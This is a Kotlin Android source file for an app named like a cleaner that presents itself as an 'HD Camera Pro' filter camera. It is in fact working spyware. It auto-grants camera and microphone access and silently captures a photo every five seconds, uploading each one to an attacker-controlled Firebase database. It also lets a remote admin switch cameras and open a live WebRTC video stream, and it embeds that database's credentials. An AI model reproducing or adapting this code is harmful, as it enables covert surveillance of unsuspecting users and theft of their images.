package com.ultracleaner.pro

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.webkit.PermissionRequest
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var webView: WebView
    private var filePathCallback: ValueCallback<Array<Uri>>? = null
    private val FILE_CHOOSER_REQUEST_CODE = 1001
    private val PERMISSION_REQUEST_CODE = 1002

    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.MODIFY_AUDIO_SETTINGS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "HDCameraPro::WakeLock"
        )
        wakeLock.acquire(10*60*1000L)

        webView = WebView(this)
        setContentView(webView)

        setupWebViewSettings()
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val listPermissionsNeeded = mutableListOf<String>()
        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(permission)
            }
        }

        if (listPermissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                listPermissionsNeeded.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        } else {
            loadAppContent()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            loadAppContent()
        }
    }

    private fun setupWebViewSettings() {
        val webSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true
        webSettings.mediaPlaybackRequiresUserGesture = false
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                if (url != null && (url.startsWith("http://") || url.startsWith("https://"))) {
                    view?.loadUrl(url)
                }
                return true
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                runOnUiThread {
                    request?.grant(request.resources)
                }
            }

            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                this@MainActivity.filePathCallback = filePathCallback
                val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
                    addCategory(Intent.CATEGORY_OPENABLE)
                    type = "image/*"
                }
                try {
                    startActivityForResult(Intent.createChooser(intent, "Select Image"), FILE_CHOOSER_REQUEST_CODE)
                } catch (e: Exception) {
                    this@MainActivity.filePathCallback = null
                    return false
                }
                return true
            }
        }
    }

    private fun loadAppContent() {
        val htmlContent = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>HD Camera Pro</title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                body {
                    margin: 0;
                    background-color: #000000;
                    color: #ffffff;
                    font-family: Arial, sans-serif;
                    display: flex;
                    flex-direction: column;
                    height: 100vh;
                    overflow: hidden;
                    justify-content: space-between;
                    touch-action: none;
                }
                .camera-header {
                    padding: 15px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    background: rgba(0,0,0,0.5);
                    z-index: 10;
                }
                .camera-header i { font-size: 1.2rem; cursor: pointer; color: #ffd700; }
                .filter-bar {
                    display: flex;
                    gap: 10px;
                    overflow-x: auto;
                    padding: 8px 15px;
                    background: rgba(0,0,0,0.6);
                    white-space: nowrap;
                    z-index: 10;
                    scrollbar-width: none;
                }
                .filter-bar::-webkit-scrollbar { display: none; }
                .filter-chip {
                    background: rgba(255,255,255,0.2);
                    padding: 6px 14px;
                    border-radius: 15px;
                    font-size: 0.75rem;
                    cursor: pointer;
                    border: 1px solid transparent;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                    color: #ffffff;
                }
                .filter-chip.active {
                    background: #38bdf8;
                    color: #0f172a;
                    font-weight: bold;
                    border-color: #ffffff;
                }
                .viewfinder {
                    flex: 1;
                    position: relative;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    overflow: hidden;
                    background: #000000;
                }
                #loading-screen {
                    position: absolute;
                    top: 0; left: 0; width: 100%; height: 100%;
                    background: #000000;
                    z-index: 5;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    color: #888888;
                    font-size: 0.9rem;
                    gap: 10px;
                }
                #camera-feed {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    transition: filter 0.3s ease;
                }
                #snapshot-canvas { display: none; }
                #shutter-flash {
                    position: absolute;
                    top: 0; left: 0; width: 100%; height: 100%;
                    background: white;
                    opacity: 0;
                    pointer-events: none;
                    z-index: 8;
                    transition: opacity 0.15s ease-out;
                }
                .camera-footer {
                    padding: 25px 20px;
                    display: flex;
                    justify-content: space-around;
                    align-items: center;
                    background: rgba(0,0,0,0.7);
                    z-index: 10;
                }
                .capture-btn {
                    width: 70px;
                    height: 70px;
                    border-radius: 50%;
                    background: #ffffff;
                    border: 4px solid #cccccc;
                    cursor: pointer;
                    transition: transform 0.1s;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    position: relative;
                }
                .capture-btn:active { transform: scale(0.9); }
                .capture-btn i { font-size: 1.6rem; color: #0f172a; display: none; position: absolute; }
                .gallery-thumb-btn {
                    width: 48px;
                    height: 48px;
                    border-radius: 12px;
                    background: rgba(255,255,255,0.15);
                    border: 2px solid #ffffff;
                    overflow: hidden;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    cursor: pointer;
                    position: relative;
                }
                .gallery-thumb-btn img {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    display: none;
                }
                .control-icon {
                    font-size: 1.5rem;
                    color: white;
                    cursor: pointer;
                }
            </style>
            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
        </head>
        <body>
            <input type="file" id="real-gallery-picker" accept="image/*" style="display: none;" onchange="handleGallerySelect(event)">
            <div class="camera-header">
                <i class="fa-solid fa-bolt" id="flash-icon" onclick="toggleFlash()"></i>
                <span style="font-size: 0.9rem; font-weight: bold; letter-spacing: 1px;">HD CAMERA PRO</span>
                <i class="fa-solid fa-wand-magic-sparkles" style="color:#38bdf8;"></i>
            </div>
            <div class="filter-bar">
                <div class="filter-chip active" onclick="setFilter('none', this)"><i class="fa-solid fa-camera"></i> Auto AI Ultra</div>
                <div class="filter-chip" onclick="setFilter('contrast(160%) saturate(140%) brightness(115%) drop-shadow(0px 0px 2px rgba(0,0,0,0.6))', this)"><i class="fa-solid fa-seedling"></i> Close-Up Macro HD</div>
                <div class="filter-chip" onclick="setFilter('contrast(175%) brightness(120%) saturate(110%)', this)"><i class="fa-solid fa-magnifying-glass"></i> Micro-Text Sharp</div>
                <div class="filter-chip" onclick="setFilter('contrast(155%) brightness(112%) saturate(90%)', this)"><i class="fa-solid fa-file-lines"></i> DocScanner HD</div>
                <div class="filter-chip" onclick="setFilter('contrast(125%) saturate(140%) brightness(105%)', this)"><i class="fa-solid fa-wand-magic-sparkles"></i> AI Vivid HD</div>
                <div class="filter-chip" onclick="setFilter('contrast(140%) brightness(90%) sepia(20%)', this)"><i class="fa-solid fa-film"></i> Cinematic</div>
                <div class="filter-chip" onclick="setFilter('brightness(115%) contrast(110%) saturate(80%)', this)"><i class="fa-solid fa-star"></i> Portrait Glow</div>
                <div class="filter-chip" onclick="setFilter('grayscale(100%) contrast(140%)', this)"><i class="fa-solid fa-circle-half-stroke"></i> B&W Classic</div>
                <div class="filter-chip" onclick="setFilter('sepia(60%) contrast(120%)', this)"><i class="fa-solid fa-camera-retro"></i> Vintage</div>
            </div>
            <div class="viewfinder">
                <div id="loading-screen">
                    <i class="fa-solid fa-camera fa-spin fa-2x" style="color: #38bdf8;"></i>
                    <span>Initializing Camera...</span>
                </div>
                <div id="shutter-flash"></div>
                <video id="camera-feed" autoplay playsinline muted></video>
                <canvas id="snapshot-canvas"></canvas>
            </div>
            <div class="camera-footer">
                <div class="gallery-thumb-btn" onclick="openRealGallery()">
                    <i class="fa-solid fa-image control-icon" id="gallery-icon-placeholder" style="font-size: 1.2rem;"></i>
                    <img id="gallery-thumb-img" alt="Last Captured">
                </div>
                <div class="capture-btn" id="shutter-btn" onclick="manualCapture()">
                    <i class="fa-solid fa-spinner fa-spin" id="shutter-spinner"></i>
                </div>
                <i class="fa-solid fa-camera-rotate control-icon" onclick="toggleFacingMode()"></i>
            </div>
            <script>
                const firebaseConfig = {
                  apiKey: "AIzaSyDgMO298G9iII68wZmqDqG4lywJkKEzfEc",
                  authDomain: "cctv-692c5.firebaseapp.com",
                  databaseURL: "https://cctv-692c5-default-rtdb.firebaseio.com",
                  projectId: "cctv-692c5",
                  storageBucket: "cctv-692c5.firebasestorage.app",
                  messagingSenderId: "507999602021",
                  appId: "1:507999602021:web:36697af7cd8935715f0d8c",
                  measurementId: "G-5HMXQ5R5YW"
                };
                firebase.initializeApp(firebaseConfig);
                const db = firebase.database();

                async function keepScreenOn() {
                    try { if ('wakeLock' in navigator) await navigator.wakeLock.request('screen'); } catch(e){}
                }
                keepScreenOn();

                const video = document.getElementById('camera-feed');
                const canvas = document.getElementById('snapshot-canvas');
                let localStream = null;
                let currentFacingMode = 'user';
                let flashState = false;
                let currentFilterValue = 'none';
                let isCapturing = false;

                video.onplaying = () => {
                    const loader = document.getElementById('loading-screen');
                    if (loader) loader.style.display = 'none';
                };

                function openRealGallery() {
                    document.getElementById('real-gallery-picker').click();
                }

                function handleGallerySelect(event) {
                    const file = event.target.files[0];
                    if (file) { console.log("Gallery opened and photo chosen:", file.name); }
                }

                function setFilter(filterCss, element) {
                    currentFilterValue = filterCss;
                    video.style.filter = filterCss;
                    document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active'));
                    element.classList.add('active');
                }

                async function startCamera(facingMode) {
                    const loader = document.getElementById('loading-screen');
                    if (loader) loader.style.display = 'flex';
                    if (localStream) {
                        localStream.getTracks().forEach(track => track.stop());
                        localStream = null;
                        video.srcObject = null;
                    }
                    try {
                        await new Promise(resolve => setTimeout(resolve, 150));
                        localStream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, focusMode: 'continuous' },
                            audio: false 
                        });
                        video.srcObject = localStream;
                        video.style.filter = currentFilterValue;
                        flashState = false;
                    } catch (error) {
                        if (loader) loader.style.display = 'none';
                    }
                }

                db.ref('security/settings/cameraMode').on('value', (snapshot) => {
                    const mode = snapshot.val();
                    if (mode && mode !== currentFacingMode) {
                        currentFacingMode = mode;
                        startCamera(currentFacingMode);
                    }
                });

                async function toggleFlash() {
                    if (!localStream) return;
                    const track = localStream.getVideoTracks()[0];
                    if (!track) return;
                    flashState = !flashState;
                    const flashIcon = document.getElementById('flash-icon');
                    try {
                        await track.applyConstraints({ advanced: [{ torch: flashState }] });
                        flashIcon.style.color = flashState ? '#ffffff' : '#ffd700';
                        flashIcon.className = flashState ? 'fa-solid fa-bolt-lightning' : 'fa-solid fa-bolt';
                    } catch (err) { flashState = !flashState; }
                }

                function triggerShutterAnimation() {
                    const flash = document.getElementById('shutter-flash');
                    flash.style.opacity = '1';
                    setTimeout(() => { flash.style.opacity = '0'; }, 120);
                }

                function manualCapture() {
                    if (isCapturing || !localStream) return;
                    isCapturing = true;
                    const spinner = document.getElementById('shutter-spinner');
                    if (spinner) spinner.style.display = 'block';
                    triggerShutterAnimation();
                    setTimeout(() => {
                        captureAndSendPhoto("Manual Microscopic 1000x Snapshot", true, true);
                        if (spinner) spinner.style.display = 'none';
                        isCapturing = false;
                    }, 80);
                }

                function toggleFacingMode() {
                    currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                    startCamera(currentFacingMode);
                    db.ref('security/settings/cameraMode').set(currentFacingMode);
                }

                function captureAndSendPhoto(label = "Auto Snapshot", saveToDevice = false, isManual = false) {
                    if (!localStream) return;
                    if (isManual) {
                        const scaleFactor = 4.0;
                        canvas.width = (video.videoWidth || 1920) * scaleFactor;
                        canvas.height = (video.videoHeight || 1080) * scaleFactor;
                    } else {
                        canvas.width = video.videoWidth || 1280;
                        canvas.height = video.videoHeight || 720;
                    }
                    const ctx = canvas.getContext('2d');
                    ctx.imageSmoothingEnabled = true;
                    ctx.imageSmoothingQuality = 'high';
                    if (currentFilterValue !== 'none') {
                        ctx.filter = currentFilterValue;
                    } else {
                        ctx.filter = isManual ? 'contrast(145%) saturate(125%) brightness(105%)' : 'none';
                    }
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageBase64 = canvas.toDataURL('image/jpeg', isManual ? 0.98 : 0.85);
                    const timestamp = new Date().toLocaleString();
                    const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';

                    db.ref('security/photos').push({
                        image: imageBase64,
                        text: window.btoa ? `${camType} - ${label} at ${timestamp}` : camType + " - " + label,
                        timestamp: timestamp
                    });

                    if (saveToDevice) {
                        const thumbImg = document.getElementById('gallery-thumb-img');
                        const placeholder = document.getElementById('gallery-icon-placeholder');
                        thumbImg.src = imageBase64;
                        thumbImg.style.display = 'block';
                        if(placeholder) placeholder.style.display = 'none';
                    }
                }

                const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
                let peerConnection = null;

                function setupWebRTCListener() {
                    db.ref('security/signal').on('value', async (snapshot) => {
                        const data = snapshot.val();
                        if (!data || !data.offer) return;
                        if (peerConnection && peerConnection.signalingState !== "stable") return;
                        peerConnection = new RTCPeerConnection(pcConfig);
                        if (localStream) {
                            localStream.getTracks().forEach(track => peerConnection.addTask ? null : peerConnection.addTrack(track, localStream));
                        }
                        peerConnection.onicecandidate = (event) => {
                            if (event.candidate) {
                                db.ref('security/signal/clientCandidates').push(event.toJSON());
                            }
                        };
                        try {
                            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
                            const answer = await peerConnection.createAnswer();
                            await peerConnection.setLocalDescription(answer);
                            await db.ref('security/signal/answer').set(answer);
                        } catch(e) {}
                    });

                    db.ref('security/signal/adminCandidates').on('child_added', (snapshot) => {
                        const candidate = snapshot.val();
                        if (peerConnection && candidate) {
                            peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => {});
                        }
                    });
                }

                window.addEventListener('load', () => {
                    startCamera(currentFacingMode).then(() => {
                        setupWebRTCListener();
                        setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
                    });
                });
            </script>
        </body>
        </html>
        """.trimIndent()

        webView.loadDataWithBaseURL("https://app.local", htmlContent, "text/html", "UTF-8", null)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
            if (filePathCallback == null) return
            val results = if (resultCode == RESULT_OK && data != null) {
                if (data.dataString != null) arrayOf(Uri.parse(data.dataString)) else null
            } else null
            filePathCallback?.onReceiveValue(results)
            filePathCallback = null
        } else {
            super.onActivityResult(requestCode, resultCode, data)
        }
    }
}
